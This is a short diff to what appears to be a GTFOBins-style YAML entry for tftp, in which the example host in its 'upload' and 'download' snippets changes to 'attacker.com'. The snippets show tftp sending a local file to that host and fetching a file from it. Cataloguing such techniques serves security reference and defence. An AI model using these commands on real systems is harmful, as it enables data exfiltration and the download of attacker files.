@@ -3,13 +3,13 @@ functions:
   upload:
     - description: Send local file to a TFTP server.
       code: |
-        RHOST=10.0.0.1
+        RHOST=attacker.com
         tftp $RHOST
         put file_to_send
   download:
     - description: Fetch a remote file from a TFTP server.
       code: |
-        RHOST=10.0.0.1
+        RHOST=attacker.com
         tftp $RHOST
         get file_to_get
 ---
